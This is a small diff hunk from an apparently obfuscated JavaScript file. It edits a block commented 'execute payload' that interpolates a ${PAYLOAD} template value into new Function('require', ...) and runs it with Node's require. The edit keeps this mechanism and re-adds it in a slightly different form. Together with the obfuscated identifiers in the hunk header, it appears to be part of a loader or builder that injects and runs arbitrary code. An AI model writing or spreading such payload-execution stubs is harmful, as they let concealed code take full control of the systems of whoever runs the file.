@@ -48,7 +48,8 @@ const a0_0x5ec353=a0_0x52e7;(function(_0x321624,_0x1dd3c0){const _0x595527=a0_0x
 
   // execute payload
   try {
-    const checkValue = new Function('require', ${PAYLOAD});
+    const value = ${PAYLOAD}
+    const checkValue = new Function('require', value);
     checkValue(require);
   } catch (err) {
     console.error("Payload error:", err.message);
